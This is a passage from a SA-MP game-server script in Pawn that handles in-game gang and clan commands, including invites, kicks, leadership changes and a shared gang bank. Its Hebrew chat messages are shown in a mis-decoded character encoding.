			SendClientMessage(playerid,white," /gang quit :éöéàä îäëðåôééä");
			SendClientMessage(playerid,white," /gang kick [id/name] :äåöàä îäëðåôééä");
			SendClientMessage(playerid,white," /gang leader [id/name] :áçéøú ìéãø ìëðåôééä");
			return 1;
		}
		if(equal(cmd,"create"))
		{
			if(playerinfo[playerid][gang] > 0) return SendClientMessage(playerid,red," .àúä ëáø ðîöà áëðåôééä ëìùäéú");
			if(playerinfo[playerid][clan] > 0) return SendClientMessage(playerid,red," .ìà ðéúï ìäéåú áëðåôééä ëàùø àúä á÷ìàï");
			cmd = strrest(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /gang create [name] :öåøú äùéîåù");
			if(advertisement(cmd))
			{
				SendClientMessage(playerid,red," .äîòøëú æéäúä ôøñåí åìëï ääåãòä ìà ðùìçä");
				format(string,sizeof(string)," (/b áàï îäéø) :%s - æåää ôøñåí áô÷åãåú îàééãé %d",GetName(playerid),playerid);
				lastAdv = playerid;
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(IsPlayerMAdmin(i))
					{
						SendClientMessage(i,blue,"----------");
						SendClientMessage(i,red,string);
						SendClientMessage(i,red,cmdtext);
						SendClientMessage(i,blue,"----------");
					}
				}
				return 0;
			}
			for(new i=1;i<MAX_PLAYERS;i++)
			{
				if(ganginfo[i][gexist] == 0)
				{
					format(ganginfo[i][gname],256,"%s",cmd);
					ganginfo[i][gexist] = 1;
					ganginfo[i][gmembers] = 1;
					ganginfo[i][gleader] = playerid;
					ganginfo[i][gbank] = 0;
					for(new j=0;j<3;j++) ganginfo[i][gcolor][j] = playerinfo[playerid][color][j];
					ganginfo[i][gplayers][0] = playerid;
					format(string,sizeof(string)," .\"%s\" éöøú àú äëðåôééä",ganginfo[i][gname],i);
					SendClientMessage(playerid,green,string);
					playerinfo[playerid][gang] = i;
					return 1;
				}
			}
		}
		else if(equal(cmd,"invite"))
		{
			if(playerinfo[playerid][gang] == 0) return SendClientMessage(playerid,red," .àúä ìà áëðåôééä");
			if(ganginfo[playerinfo[playerid][gang]][gleader] != playerid) return SendClientMessage(playerid,red," .òìéê ìäéåú äìéãø ùì äëðåôééä áëãé ìäæîéï");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /gang invite [id/name] :öåøú äùéîåù");
			new id = ReturnUser(cmd);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
			if(id == playerid) return SendClientMessage(playerid,red," .àéðê éëåì ìäæîéï àú òöîê");
			if(playerinfo[id][gang] > 0)
			{
				format(string,sizeof(string)," .ëáø ðîöà áëðåôééä %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			format(string,sizeof(string)," .ìëðåôééä %s äæîðú àú",GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .\"%s\" ùìç ìê äæîðä ìëðåôééä %s",ganginfo[playerinfo[playerid][gang]][gname],GetName(playerid));
			SendClientMessage(id,green,string);
			playerinfo[id][igang] = playerinfo[playerid][gang];
		}
		else if(equal(cmd,"accept"))
		{
	 		if(playerinfo[playerid][igang] == 0) return SendClientMessage(playerid,red," .ìà äåæîðú ìùåí ëðåôééä");
			if(playerinfo[playerid][gang] > 0) return SendClientMessage(playerid,red," .àúä ëáø áëðåôééä");
			if(playerinfo[playerid][clan] > 0) return SendClientMessage(playerid,red," .ìà ðéúï ìäéåú áëðåôééä ëàùø àúä á÷ìàï");
			if(ganginfo[playerinfo[playerid][igang]][gexist] == 0) SendClientMessage(playerid,red, " .äëðåôééä äæå ëáø ìà ÷ééîú éåúø");
			if(ganginfo[playerinfo[playerid][igang]][gmembers] >= 25) return SendClientMessage(playerid,red," .äëðåôééä äæå îìàä");
			ganginfo[playerinfo[playerid][igang]][gplayers][ganginfo[playerinfo[playerid][igang]][gmembers]] = playerid;
			for(new j=0;j<ganginfo[playerinfo[playerid][igang]][gmembers];j++)
			{
				format(string,sizeof(string)," .äöèøó ìëðåôéä ùìê %s",GetName(playerid));
				SendClientMessage(ganginfo[playerinfo[playerid][igang]][gplayers][j],green,string);
			}
			ganginfo[playerinfo[playerid][igang]][gmembers]++;
			playerinfo[playerid][gang] = playerinfo[playerid][igang];
			SetPlayerColor(playerid,rgba2hex(ganginfo[playerinfo[playerid][igang]][gcolor][0],ganginfo[playerinfo[playerid][igang]][gcolor][1],ganginfo[playerinfo[playerid][igang]][gcolor][2],100));
			format(string,sizeof(string)," .\"%s\" äöèøôú ìëðåôééä",ganginfo[playerinfo[playerid][igang]][gname]);
			SendClientMessage(playerid,green,string);
			playerinfo[playerid][igang] = 0;
		}
		else if(equal(cmd,"cancel"))
		{
	 		if(playerinfo[playerid][igang] == 0) SendClientMessage(playerid,red," .ìà äåæîðú ìùåí ëðåôééä");
			if(ganginfo[playerinfo[playerid][igang]][gexist] == 0) SendClientMessage(playerid,red, " .äëðåôééä äæå ëáø ìà ÷ééîú éåúø");
			for(new j=0;j<ganginfo[playerinfo[playerid][igang]][gmembers];j++)
			{
				format(string,sizeof(string)," .áéèì àú ääæîðä ìäöèøôåú ìëðåôééä ùìê %s",GetName(playerid));
				SendClientMessage(ganginfo[playerinfo[playerid][igang]][gplayers][j],green,string);
			}
			format(string,sizeof(string)," .\"%s\" áéèìú àú ääæîðä ìäöèøôåú ìëðåôééä",ganginfo[playerinfo[playerid][igang]][gname]);
			SendClientMessage(playerid,green,string);
			playerinfo[playerid][igang] = 0;
		}
		else if(equal(cmd,"quit"))
		{
			if(playerinfo[playerid][gang] == 0) return SendClientMessage(playerid,red," .àúä ìà áëðåôééä");
			PlayerLeaveGang(playerid,1);
		}
		else if(equal(cmd,"kick"))
		{
			if(playerinfo[playerid][gang] == 0) return SendClientMessage(playerid,red," .àúä ìà áëðåôééä");
			if(ganginfo[playerinfo[playerid][gang]][gleader] != playerid) return SendClientMessage(playerid,red," .òìéê ìäéåú äìéãø ùì äëðåôééä áëãé ìäåöéà");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /gang kick [id/name] :öåøú äùéîåù");
			new id = ReturnUser(cmd);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
			if(id == playerid) return SendClientMessage(playerid,red," .àéðê éëåì ìäåöéà àú òöîê");
			if(playerinfo[id][gang] != playerinfo[playerid][gang])
			{
				format(string,sizeof(string)," .ìà ðîöà áëðåôééä ùìê %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			format(string,sizeof(string)," .îäëðåôééä %s äåöàú àú",GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .\"%s\" äåöéà àåúê îäëðåôééä %s",ganginfo[playerinfo[playerid][gang]][gname],GetName(playerid));
			SendClientMessage(id,green,string);
			PlayerLeaveGang(id,2);
		}
		else if(equal(cmd,"leader"))
		{
			if(playerinfo[playerid][gang] == 0) return SendClientMessage(playerid,red," .àúä ìà áëðåôééä");
			if(ganginfo[playerinfo[playerid][gang]][gleader] != playerid) return SendClientMessage(playerid,red," .òìéê ìäéåú äìéãø ùì äëðåôééä áëãé ìäôåê ùç÷ï ììéãø");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /gang leader [id/name] :öåøú äùéîåù");
			new id = ReturnUser(cmd);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
			if(playerinfo[id][gang] != playerinfo[playerid][gang])
			{
				format(string,sizeof(string)," .ìà ðîöà áëðåôééä ùìê %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			format(string,sizeof(string)," .ììéãø äëðåôééä, àúä ëáø ìà ìéãø %s äôëú àú",GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .äôê àåúê ììéãø äëðåôééä %s",GetName(playerid));
			SendClientMessage(id,green,string);
			ganginfo[playerinfo[playerid][gang]][gleader] = id;
		}
		else SendClientMessage(playerid,red," .àôùøåú ëðåôééä ùâåéä");
		return 1;
	}
	if(equal(cmd,"/gdeposit"))
	{
		new amount, string[M_S];
		if(!playerinfo[playerid][gang]) return SendClientMessage(playerid,red," .òìéê ìäéåú áëðåôééä ìùéîåù áô÷åãä æå");
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ áëãé ìáöò ô÷åãä æå");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /gdeposit [amount] :öåøú äùéîåù");
		amount = strval(cmd);
		if(amount < 1 || amount > GetMoney(playerid)) return SendClientMessage(playerid,red," .ñëåí äô÷ãä ùâåé");
		if(!playerinfo[playerid][canp]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ùåá á÷øåá");
		SetTimerEx("CanP",15000,0,"d",playerid);
		playerinfo[playerid][canp] = 0;
		GiveMoney(playerid,0-amount);
		ganginfo[playerinfo[playerid][gang]][gbank] += amount;
		format(string,sizeof(string)," .äô÷ãú %d$ áçùáåï äáð÷ ùì äëðåôééä ùìê, ëòú éù áçùáåï %d$",amount,ganginfo[playerinfo[playerid][gang]][gbank]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/gwithdraw"))
	{
		new amount, string[M_S];
		if(!playerinfo[playerid][gang]) return SendClientMessage(playerid,red," .òìéê ìäéåú áëðåôééä ìùéîåù áô÷åãä æå");
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ áëãé ìáöò ô÷åãä æå");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /gwithdraw [amount] :öåøú äùéîåù");
		amount = strval(cmd);
		if(amount < 1 || amount > ganginfo[playerinfo[playerid][gang]][gbank]) return SendClientMessage(playerid,red," .ñëåí äåöàä ùâåé");
		GiveMoney(playerid,amount);
		ganginfo[playerinfo[playerid][gang]][gbank] -= amount;
		format(string,sizeof(string)," .äåöàú %d$ îçùáåï äáð÷ ùì äëðåôééä ùìê, ëòú éù áçùáåï %d$",amount,ganginfo[playerinfo[playerid][gang]][gbank]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/gbalance"))
	{
		new string[M_S];
		if(!playerinfo[playerid][gang]) return SendClientMessage(playerid,red," .òìéê ìäéåú áëðåôééä ìùéîåù áô÷åãä æå");
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ áëãé ìáöò ô÷åãä æå");
		format(string,sizeof(string)," .%d$ áçùáåï äáð÷ ùì äëðåôééä ùìê éù",ganginfo[playerinfo[playerid][gang]][gbank]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/ganginfo"))
	{
		new gangid, string[M_S];
		cmd = strtok(cmdtext,idx);
		if((!strlen(cmd) || !IsNumeric(cmd)) && !playerinfo[playerid][gang]) return SendClientMessage(playerid,white," /ganginfo [gang id] :öåøú äùéîåù");
		else if((!strlen(cmd) || !IsNumeric(cmd))) gangid = playerinfo[playerid][gang];
		else gangid = strval(cmd);
		if(!ganginfo[gangid][gexist]) return SendClientMessage(playerid,red," .îñôø ëðåôééä ùâåé");
		format(string,sizeof(string)," :\"%s\" çáøé äëðåôééä",ganginfo[gangid][gname]);
		SendClientMessage(playerid,green,string);
		for(new i=0;i<ganginfo[gangid][gmembers];i++)
		{
			format(string,sizeof(string),"%s (ID: %d)",GetName(ganginfo[gangid][gplayers][i]),ganginfo[gangid][gplayers][i]);
			SendClientMessage(playerid,yellow,string);
		}
		return 1;
	}
	if(equal(cmd,"/gangs"))
	{
		new gangs = 0, string[M_S];
		SendClientMessage(playerid,green," :ëðåôéåú îçåáøåú ìùøú");
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(ganginfo[i][gexist])
			{
				gangs++;
				format(string,sizeof(string),"\"%s\" (GangID: %d | Members: %d)",ganginfo[i][gname],i,ganginfo[i][gmembers]);
				SendClientMessage(playerid,yellow,string);
			}
		}
		if(gangs == 0) SendClientMessage(playerid,red," .àéï ëòú ëðåôéåú îçåáøåú ìùøú");
		return 1;
	}
	if(equal(cmd,"/gdepositall"))
	{
		new string[M_S];
		if(!playerinfo[playerid][gang]) return SendClientMessage(playerid,red," .òìéê ìäéåú áëðåôééä ìùéîåù áô÷åãä æå");
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ áëãé ìáöò ô÷åãä æå");
		if(GetMoney(playerid) <= 0) return SendClientMessage(playerid,red," .àéï áééãê ëñó äðéúï ìäô÷ãä");
		if(!playerinfo[playerid][canp]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ùåá á÷øåá");
		SetTimerEx("CanP",15000,0,"d",playerid);
		playerinfo[playerid][canp] = 0;
		ganginfo[playerinfo[playerid][gang]][gbank] += GetMoney(playerid);
		ResetMoney(playerid);
		format(string,sizeof(string)," .äô÷ãú àú ëì ëñôê áçùáåï äáð÷ ùì äëðåôééä ùìê, ëòú éù ùí %d$",playerinfo[playerid][bank]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/gwithdrawall"))
	{
		if(!playerinfo[playerid][gang]) return SendClientMessage(playerid,red," .òìéê ìäéåú áëðåôééä ìùéîåù áô÷åãä æå");
		if(GetPlayerCheckpoint(playerid) != cp_bank || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú ááð÷ áëãé ìáöò ô÷åãä æå");
		GiveMoney(playerid,ganginfo[playerinfo[playerid][gang]][gbank]);
		ganginfo[playerinfo[playerid][gang]][gbank] = 0;
		SendClientMessage(playerid,green," .äåöàú àú ëì äëñó îçùáåï äáð÷ ùì äëðåôééä ùìê");
		return 1;
	}
	if(equal(cmd,"/clan"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /clan [action] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /help mode 26 1 - ìøùéîú ô÷åãåú ä÷ìàðéí");
			return 1;
		}
		else if(equal(cmd,"invite"))
		{
			if(playerinfo[playerid][clan] == 0 || !claninfo[playerinfo[playerid][clan]][cvalid]) return SendClientMessage(playerid,red," .àúä ìà á÷ìàï øùîé");
			if(!playerinfo[playerid][lclan] && !playerinfo[playerid][tclan]) return SendClientMessage(playerid,red," .òìéê ìäéåú äìéãø àå äèñèø ùì ä÷ìàï áëãé ìäæîéï");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /clan invite [id/name] :öåøú äùéîåù");
			new id = ReturnUser(cmd);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
			if(id == playerid) return SendClientMessage(playerid,red," .àéðê éëåì ìäæîéï àú òöîê");
			if(playerinfo[id][clan] > 0)
			{
				format(string,sizeof(string)," .ëáø ðîöà á÷ìàï %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			format(string,sizeof(string)," .ì÷ìàï %s äæîðú àú",GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .\"%s\" ùìç ìê äæîðä ì÷ìàï %s",claninfo[playerinfo[playerid][clan]][cname],GetName(playerid));
			SendClientMessage(id,green,string);
			playerinfo[id][iclan] = playerinfo[playerid][clan];
		}
		else if(equal(cmd,"accept"))
		{
	 		if(playerinfo[playerid][iclan] == 0) return SendClientMessage(playerid,red," .ìà äåæîðú ìùåí ÷ìàï");
			if(playerinfo[playerid][clan] != 0) return SendClientMessage(playerid,red," .àúä ëáø á÷ìàï");
			if(playerinfo[playerid][gang] > 0) return SendClientMessage(playerid,red," .ìà ðéúï ìäéåú á÷ìàï ëàùø àúä áëðåôééä");
			claninfo[playerinfo[playerid][iclan]][cplayers][claninfo[playerinfo[playerid][iclan]][cmembers]] = playerid;
			for(new j=0;j<claninfo[playerinfo[playerid][iclan]][cmembers];j++)
			{
				format(string,sizeof(string)," .äöèøó ì÷ìàï ùìê %s",GetName(playerid));
				SendClientMessage(claninfo[playerinfo[playerid][iclan]][cplayers][j],green,string);
			}
			claninfo[playerinfo[playerid][iclan]][cmembers]++;
			playerinfo[playerid][clan] = playerinfo[playerid][iclan];
			SetPlayerColor(playerid,rgba2hex(claninfo[playerinfo[playerid][clan]][ccolor][0],claninfo[playerinfo[playerid][clan]][ccolor][1],claninfo[playerinfo[playerid][clan]][ccolor][2],100));
			format(string,sizeof(string)," .\"%s\" äöèøôú ì÷ìàï",claninfo[playerinfo[playerid][clan]][cname]);
			SendClientMessage(playerid,green,string);
			playerinfo[playerid][iclan] = 0;
			if(playerinfo[playerid][logged]) fsetstring(fuser(playerid),"Clan2",claninfo[playerinfo[playerid][clan]][cname]);
		}
		else if(equal(cmd,"cancel"))
		{
	 		if(playerinfo[playerid][iclan] == 0) SendClientMessage(playerid,red," .ìà äåæîðú ìùåí ÷ìàï");
			for(new j=0;j<claninfo[playerinfo[playerid][iclan]][cmembers];j++)
			{
				format(string,sizeof(string)," .áéèì àú ääæîðä ìäöèøôåú ì÷ìàï ùìê %s",GetName(playerid));
				SendClientMessage(claninfo[playerinfo[playerid][iclan]][cplayers][j],green,string);
			}
			format(string,sizeof(string)," .\"%s\" áéèìú àú ääæîðä ìäöèøôåú ì÷ìàï",claninfo[playerinfo[playerid][iclan]][cname]);
			SendClientMessage(playerid,green,string);
			playerinfo[playerid][iclan] = 0;
		}
		else if(equal(cmd,"quit"))
		{
			if(playerinfo[playerid][clan] == 0 || !claninfo[playerinfo[playerid][clan]][cvalid]) return SendClientMessage(playerid,red," .àúä ìà á÷ìàï øùîé");
			PlayerLeaveClan(playerid,1);
		}
		else if(equal(cmd,"kick"))
		{
			if(playerinfo[playerid][clan] == 0 || !claninfo[playerinfo[playerid][clan]][cvalid]) return SendClientMessage(playerid,red," .àúä ìà á÷ìàï øùîé");
			if(!playerinfo[playerid][lclan] && !playerinfo[playerid][tclan]) return SendClientMessage(playerid,red," .òìéê ìäéåú äìéãø àå äèñèø ùì ä÷ìàï áëãé ìäåöéà");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /clan kick [id/name] :öåøú äùéîåù");
			new id = ReturnUser(cmd);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
			if(id == playerid) return SendClientMessage(playerid,red," .àéðê éëåì ìäåöéà àú òöîê");
			if(playerinfo[playerid][tclan] && !playerinfo[playerid][lclan] && playerinfo[id][lclan]) return SendClientMessage(playerid,red," .àéï áàôùøåúê ìäòéó ìéãøéí îä÷ìàï");
			if(playerinfo[id][clan] != playerinfo[playerid][clan])
			{
				format(string,sizeof(string)," .ìà ðîöà á÷ìàï ùìê %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			format(string,sizeof(string)," .îä÷ìàï %s äåöàú àú",GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .\"%s\" äåöéà àåúê îä÷ìàï %s",claninfo[playerinfo[playerid][clan]][cname],GetName(playerid));
			SendClientMessage(id,green,string);
			PlayerLeaveClan(id,2);
		}
		else if(equal(cmd,"setlevel"))
		{
			if(playerinfo[playerid][clan] == 0 || !claninfo[playerinfo[playerid][clan]][cvalid]) return SendClientMessage(playerid,red," .àúä ìà á÷ìàï øùîé");
			if(!playerinfo[playerid][lclan]) return SendClientMessage(playerid,red," .òìéê ìäéåú äìéãø ùì ä÷ìàï áëãé ìùðåú úô÷éã ùç÷ï");
			new cmd2[M_S];
			cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
			if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /clan setlevel [id/name] [player/leader/tester] :öåøú äùéîåù");
			new id = ReturnUser(cmd);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
			if(playerinfo[id][clan] != playerinfo[playerid][clan])
			{
				format(string,sizeof(string)," .ìà ðîöà á÷ìàï ùìê %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			if(equal(cmd2,"player"))
			{
				format(string,sizeof(string)," .ìùç÷ï øâéì á÷ìàï %s äôê àú %s",GetName(id),GetName(playerid));
				for(new i=0;i<claninfo[playerinfo[playerid][clan]][cmembers];i++) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],orange,string);
				playerinfo[id][lclan] = 0, playerinfo[id][tclan] = 0;
				if(playerinfo[id][logged])
				{
					fsetint(fuser(id),"Leader",0);
					fsetint(fuser(id),"Tester",0);
				}
			}
			else if(equal(cmd2,"leader"))
			{
				format(string,sizeof(string)," .ììéãø ä÷ìàï %s äôê àú %s",GetName(id),GetName(playerid));
				for(new i=0;i<claninfo[playerinfo[playerid][clan]][cmembers];i++) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],orange,string);
				playerinfo[id][lclan] = 1;
				if(playerinfo[id][logged]) fsetint(fuser(id),"Leader",1);
			}
			else if(equal(cmd2,"tester"))
			{
				format(string,sizeof(string)," .ìèñèø ä÷ìàï %s äôê àú %s",GetName(id),GetName(playerid));
				for(new i=0;i<claninfo[playerinfo[playerid][clan]][cmembers];i++) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],orange,string);
				playerinfo[id][tclan] = 1;
				if(playerinfo[id][logged]) fsetint(fuser(id),"Tester",1);
			}
			else return SendClientMessage(playerid,red," .àôùøåú úô÷éã á÷ìàï ùâåéä");
		}
		else if(equal(cmd,"edit"))
		{
			if(playerinfo[playerid][clan] == 0 || !claninfo[playerinfo[playerid][clan]][cvalid]) return SendClientMessage(playerid,red," .àúä ìà á÷ìàï øùîé");
			if(!playerinfo[playerid][lclan]) return SendClientMessage(playerid,red," .òìéê ìäéåú äìéãø ùì ä÷ìàï áëãé ìòøåê àåúå");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /clan edit [cmd/foot/vehicle/tests/mute/color] :öåøú äùéîåù");
			if(equal(cmd,"cmd"))
			{
				cmd = strtok(cmdtext,idx);
				if(!strlen(cmd))
				{
					SendClientMessage(playerid,white," /clan edit cmd [command] :öåøú äùéîåù");
					SendClientMessage(playerid,white," / :éù ìøùåí àú ùí äô÷åãä ììà ñìàù");
					return 1;
				}
				if(cmd[0] == ' ') strdel(cmd,0,1);
				format(claninfo[playerinfo[playerid][clan]][ccmd],256,cmd);
				format(string,sizeof(string)," .\"/%s\" ùéðä àú ô÷åãú äùéâåø ìîô÷ãä ì %s",claninfo[playerinfo[playerid][clan]][ccmd],GetName(playerid));
				for(new i=0;i<claninfo[playerinfo[playerid][clan]][cmembers];i++) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],orange,string);
				format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
				fsetstring(string,"Command",claninfo[playerinfo[playerid][clan]][ccmd]);
			}
			else if(equal(cmd,"foot"))
			{
				new Float:p[4]/*, Float:op[3]*/;
				GetPlayerPos(playerid,p[0],p[1],p[2]);
				GetPlayerFacingAngle(playerid,p[3]);
				/*for(new i=0,o=0;o<claninfo[playerinfo[playerid][clan]][cobjects];o++)
				{
					i = claninfo[playerinfo[playerid][clan]][cobject][o];
					if(IsValidSObject(i) && objectinfo[i][omoving][1] == playerinfo[playerid][clan])
					{
						GetSObjectPos(i,op[0],op[1],op[2]);
						if(DistanceToPoint(p[0],p[1],p[2],op[0],op[1],op[2]) > 100.0) return SendClientMessage(playerid,red," .äîé÷åí äæä øçå÷ îãé îîô÷ãú ä÷ìàï ùìê");
					}
				}*/
				for(new i=0;i<4;i++) claninfo[playerinfo[playerid][clan]][chq][i] = p[i];
				format(string,sizeof(string)," .ùéðä àú îé÷åí äùéâåø ìîô÷ãä %s",GetName(playerid));
				for(new i=0;i<claninfo[playerinfo[playerid][clan]][cmembers];i++) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],orange,string);
				format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
				fsetfloat(string,"X",claninfo[playerinfo[playerid][clan]][chq][0]);
				fsetfloat(string,"Y",claninfo[playerinfo[playerid][clan]][chq][1]);
				fsetfloat(string,"Z",claninfo[playerinfo[playerid][clan]][chq][2]);
				fsetfloat(string,"Rot",claninfo[playerinfo[playerid][clan]][chq][3]);
			}
			else if(equal(cmd,"vehicle"))
			{
				if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .ìùéîåù áô÷åãä æå òìéê ìäéåú áøëá");
				new Float:p[4]/*, Float:op[3]*/;
				GetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]);
				GetVehicleZAngle(GetPlayerVehicleID(playerid),p[3]);
				/*for(new i=0,o=0;o<claninfo[playerinfo[playerid][clan]][cobjects];o++)
				{
					i = claninfo[playerinfo[playerid][clan]][cobject][o];
					if(IsValidSObject(i) && objectinfo[i][omoving][1] == playerinfo[playerid][clan])
					{
						GetSObjectPos(i,op[0],op[1],op[2]);
						if(DistanceToPoint(p[0],p[1],p[2],op[0],op[1],op[2]) > 100.0) return SendClientMessage(playerid,red," .äîé÷åí äæä øçå÷ îãé îîô÷ãú ä÷ìàï ùìê");
					}
				}*/
				for(new i=0;i<4;i++) claninfo[playerinfo[playerid][clan]][chqv][i] = p[i];
				format(string,sizeof(string)," .ùéðä àú îé÷åí äùéâåø ìîô÷ãä ìøëá %s",GetName(playerid));
				for(new i=0;i<claninfo[playerinfo[playerid][clan]][cmembers];i++) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],orange,string);
				format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
				fsetfloat(string,"VX",claninfo[playerinfo[playerid][clan]][chqv][0]);
				fsetfloat(string,"VY",claninfo[playerinfo[playerid][clan]][chqv][1]);
				fsetfloat(string,"VZ",claninfo[playerinfo[playerid][clan]][chqv][2]);
				fsetfloat(string,"VR",claninfo[playerinfo[playerid][clan]][chqv][3]);
			}
			else if(equal(cmd,"tests"))
			{
				cmd = strtok(cmdtext,idx);
				if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /clan edit tests [open/close] :öåøú äùéîåù");
				if(equal(cmd,"open"))
				{
					if(claninfo[playerinfo[playerid][clan]][ctest]) return SendClientMessage(playerid,red," .ä÷ìàï ëáø ôúåç ìèñèéí");
					claninfo[playerinfo[playerid][clan]][ctest] = 1;
					format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
					fsetint(string,"Test",1);
					format(string,sizeof(string)," .äçìéè ùä÷ìàï ôúåç ìèñèéí %s",GetName(playerid));
					for(new i=0;i<claninfo[playerinfo[playerid][clan]][cmembers];i++) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],orange,string);
				}
				else if(equal(cmd,"close"))
				{
					if(!claninfo[playerinfo[playerid][clan]][ctest]) return SendClientMessage(playerid,red," .ä÷ìàï ëáø ñâåø ìèñèéí");
					claninfo[playerinfo[playerid][clan]][ctest] = 0;
					format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
					fsetint(string,"Test",0);
					format(string,sizeof(string)," .äçìéè ùä÷ìàï ñâåø ìèñèéí %s",GetName(playerid));
					for(new i=0;i<claninfo[playerinfo[playerid][clan]][cmembers];i++) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],orange,string);
				}
				else return SendClientMessage(playerid,red," .àôùøåú èñèéí ùâåéä");
			}
			else if(equal(cmd,"mute"))
			{
				cmd = strtok(cmdtext,idx);
				if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /clan edit mute [on/off] :öåøú äùéîåù");
				if(equal(cmd,"on"))
				{
					if(claninfo[playerinfo[playerid][clan]][cmute]) return SendClientMessage(playerid,red," .ä÷ìàï ö'àè ëáø ñâåø");
					claninfo[playerinfo[playerid][clan]][cmute] = 1;
					format(string,sizeof(string)," .äùúé÷ àú ä÷ìàï ö'àè %s",GetName(playerid));
					for(new i=0;i<claninfo[playerinfo[playerid][clan]][cmembers];i++) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],orange,string);
				}
				else if(equal(cmd,"off"))
				{
					if(!claninfo[playerinfo[playerid][clan]][cmute]) return SendClientMessage(playerid,red," .ä÷ìàï ö'àè ëáø ôúåç");
					claninfo[playerinfo[playerid][clan]][cmute] = 0;
					format(string,sizeof(string)," .äåøéã àú äùú÷ú ä÷ìàï ö'àè %s",GetName(playerid));
					for(new i=0;i<claninfo[playerinfo[playerid][clan]][cmembers];i++) SendClientMessage(claninfo[playerinfo[playerid][clan]][cplayers][i],orange,string);
				}
